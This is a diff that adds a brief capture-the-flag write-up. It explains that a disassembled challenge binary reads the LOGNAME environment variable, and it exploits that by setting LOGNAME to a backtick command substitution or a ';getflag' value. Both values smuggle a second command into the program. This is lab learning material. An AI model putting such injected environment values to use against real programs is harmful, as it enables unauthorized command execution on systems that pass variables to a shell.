@@ -1,0 +1,11 @@
+
+by dissambling (using hooper here) we notice that there's a getenv("LOGNAME")
+we can assume that the binary use the LOGNAME Value in env to print
+we can exploit this to launch the getflag
+by changing Logname by export LOGNAME=\`getflag\`
+
+you can exploit the binary
+
+export LOGNAME=\`getflag\`
+alternative
+export LOGNAME=";getflag"
